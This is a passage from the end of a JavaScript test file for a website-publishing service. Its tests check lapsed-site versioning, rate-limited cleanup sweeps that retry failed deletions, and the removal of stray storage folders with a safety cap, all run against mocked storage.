    assert.strictEqual(again.status, 200, JSON.stringify(again.json)); assert.strictEqual(again.json.version, 2, 'folder numbers continue; nothing is reused');
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:lapsing-shop')), { id: lapse, version: 2, status: 'live' }); assert(files(lapse) > 0);
  });

  await test('cleanup brakes: at most 25 sites per run; one failing site does not stop the others and is tried again', async () => {
    const { f, pub, setClock } = setup();
    for (let i = 0; i < 30; i++) {
      const u = 'user-' + i; f.addEntitlement(u, '2026-12-01T00:00:00Z');
      const r = await pub.publish({ userId: u, name: 'shop-' + String(i).padStart(2, '0') + 'x', files: [html()] }); assert.strictEqual(r.status, 200);
    }
    setClock('2026-12-20T00:00:00.000Z'); assert.strictEqual((await pub.sweep()).lapsed, 30);
    setClock('2027-03-20T00:00:00.000Z');
    const idOf = (name) => f.sites.find((x) => x.name === name).id;
    const bad = idOf('shop-03x'); const realDelete = f.bucket.delete.bind(f.bucket);
    f.bucket.delete = async (k) => { if (k.startsWith('sites/' + bad + '/')) throw new Error('r2 down'); return realDelete(k); };
    const run1 = await pub.sweep(); assert.strictEqual(run1.purged + (run1.failed || 0), 25, 'twenty-five sites looked at in one run: ' + JSON.stringify(run1)); assert.strictEqual(run1.failed, 1, 'the failing one is counted');
    assert.strictEqual(f.sites.find((x) => x.id === bad).version, 1, 'a site whose files could not be deleted is not marked as purged');
    f.bucket.delete = realDelete;
    const run2 = await pub.sweep(); assert.strictEqual(run2.purged, 6, 'the rest next time, with the one that failed: ' + JSON.stringify(run2));
    assert.strictEqual((await pub.sweep()).purged, 0); assert.strictEqual([...f.objects.keys()].length, 0, 'every file of the 30 sites is gone');
  });

  await test('stray folders in R2 (no site in the database) are removed; too many strays means something is wrong, so nothing is deleted', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE); f.addEntitlement('u2', FUTURE);
    const a = (await pub.publish({ userId: 'u1', name: 'real-one', files: [html()] })).json.siteId; const b = (await pub.publish({ userId: 'u2', name: 'real-two', files: [html()] })).json.siteId;
    const put = (id) => f.bucket.put('sites/' + id + '/1/index.html', new Uint8Array([1]));
    await put('00000000-0000-4000-8000-0000000000aa'); // a folder left behind by a failure
    const out = await pub.sweep(); assert.strictEqual(out.strays, 1, JSON.stringify(out));
    assert(![...f.objects.keys()].some((k) => k.includes('0000000000aa')), 'the stray is gone'); assert([...f.objects.keys()].some((k) => k.startsWith('sites/' + a + '/')) && [...f.objects.keys()].some((k) => k.startsWith('sites/' + b + '/')), 'real sites untouched');
    for (let i = 0; i < 8; i++) await put('00000000-0000-4000-8000-00000000f' + String(i).padStart(3, '0'));
    const out2 = await pub.sweep(); assert.strictEqual(out2.strays, 0); assert.strictEqual(out2.straysSkipped, 8, 'eight strays beside two real folders: more than half, so nothing is deleted and it is reported');
    assert.strictEqual([...f.objects.keys()].filter((k) => k.includes('00000000f')).length, 8, 'still there');
    for (let i = 0; i < 40; i++) await put('00000000-0000-4000-8000-0000000b' + String(i).padStart(4, '0'));
    assert.strictEqual((await pub.sweep()).straysSkipped, 48, 'and more than 25 is never deleted in one run');
  });

  console.log(`✓ publish: ${count} groups (files, scan, payment, names, versions, failures, limits, unpublish)`);
})().catch((e) => { console.error(e); process.exit(1); });
